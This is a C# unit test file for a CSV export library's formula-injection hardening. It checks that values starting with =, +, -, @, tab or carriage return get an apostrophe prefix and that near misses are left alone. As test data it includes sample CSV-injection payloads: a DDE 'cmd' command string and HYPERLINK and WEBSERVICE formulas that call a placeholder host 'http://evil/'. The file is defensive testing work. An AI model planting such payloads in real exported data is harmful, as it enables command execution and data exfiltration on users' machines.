namespace Craticula.Export.Csv.Tests;

/// <summary>
/// EXP-6's rule as a rule, one character at a time. The six conformance fixtures
/// (<c>page-export/016</c>-<c>020</c>, <c>/022</c>) grade the six triggers as bytes in a whole file,
/// which is what they are for; the enumeration itself — including the near misses, which no fixture
/// can carry without changing its own expected bytes for an unrelated reason — belongs here.
/// </summary>
public class FormulaInjectionHardeningTests
{
    /// <summary>The six, each on a value that reads like something a user would actually have typed,
    /// so a failure names the character rather than a synthetic token.</summary>
    [Theory]
    [InlineData("=1+2", "'=1+2")]
    [InlineData("+1234567890", "'+1234567890")]
    [InlineData("-2+3", "'-2+3")]
    [InlineData("@SUM(A1:A10)", "'@SUM(A1:A10)")]
    [InlineData("\tImportant client", "'\tImportant client")]
    [InlineData("\rHe said hello", "'\rHe said hello")]
    // The three that carry a real payload rather than a marker character: these are the values the
    // rule exists for, and they are prefixed by the same single test on the first character.
    [InlineData("=cmd|'/c calc'!A1", "'=cmd|'/c calc'!A1")]
    [InlineData("=HYPERLINK(\"http://evil/\"&A1,\"click\")", "'=HYPERLINK(\"http://evil/\"&A1,\"click\")")]
    [InlineData("@WEBSERVICE(\"http://evil/\")", "'@WEBSERVICE(\"http://evil/\")")]
    public void Prefixes_A_Value_Whose_First_Character_Is_One_Of_EXP_6s_Six_Triggers(string text, string expected)
    {
        Assert.Equal(expected, FormulaInjectionHardening.Harden(text, enabled: true));
    }

    /// <summary>
    /// The near misses, which are the half of the rule that decides how much ordinary data survives it.
    ///
    /// <para>Two are worth reading twice. <b>LF is not a trigger and CR is</b>, because EXP-6 lists CR
    /// alone and OWASP's canonical set is these six. Note what the cost of adding LF would <em>not</em>
    /// be: only the FIRST character is examined, so it would touch cells that <em>begin</em> with a line
    /// feed, not every multi-line cell — the blast radius is small, and the honest reason to leave LF out
    /// is that neither EXP-6 nor OWASP includes it, not that including it would be expensive. That is
    /// worth stating precisely, because the class remarks justify tab and CR by their being
    /// <em>invisible</em> (a consumer that strips one promotes the character behind it to first
    /// position), and that argument reads as though it covers LF too. <b>#1653 settled it where this
    /// comment said it had to be settled: at EXP-6 itself</b>, in <c>docs/TRD-grid-query-compiler.md</c>
    /// §6.1 — LF is absent because in a CSV it is the RECORD separator (RFC 4180), so a consumer reads a
    /// bare LF as a line boundary rather than as intra-field whitespace to strip, and the strip-and-promote
    /// pathway that makes tab and CR dangerous does not exist for it. Read that clause before widening
    /// this set; it also records the one observation that would justify doing so. And <b>the apostrophe
    /// itself is not a trigger</b>, which is what makes the rule safe to apply to already-hardened text:
    /// the writer can never emit two.</para>
    /// </summary>
    [Theory]
    [InlineData("plain")]
    [InlineData("1234.50")]
    [InlineData("a=b")]
    [InlineData("Jean-Luc")]
    [InlineData("me@example.com")]
    [InlineData(" =1+2")]
    [InlineData("\nleading line feed")]
    [InlineData("'already text")]
    [InlineData("\"quoted\"")]
    public void Leaves_Everything_Else_Exactly_As_It_Was(string text)
    {
        Assert.Same(text, FormulaInjectionHardening.Harden(text, enabled: true));
    }

    /// <summary>The empty string has no first character to neutralize, and it is also what a NULL cell
    /// renders as (<see cref="CsvValueFormatter"/>): prefixing it would turn "no value" into a
    /// one-character value and the row would stop round-tripping.</summary>
    [Fact]
    public void Never_Prefixes_The_Empty_String()
    {
        Assert.Equal(string.Empty, FormulaInjectionHardening.Harden(string.Empty, enabled: true));
    }

    /// <summary>EXP-6's "configurable off", at the level of the rule itself: disabled, the function is
    /// the identity — not a weaker variant of itself.</summary>
    [Theory]
    [InlineData("=1+2")]
    [InlineData("+1234567890")]
    [InlineData("-2+3")]
    [InlineData("@SUM(A1:A10)")]
    [InlineData("\tImportant client")]
    [InlineData("\rHe said hello")]
    public void Returns_The_Value_Untouched_When_Hardening_Is_Off(string text)
    {
        Assert.Same(text, FormulaInjectionHardening.Harden(text, enabled: false));
    }
}
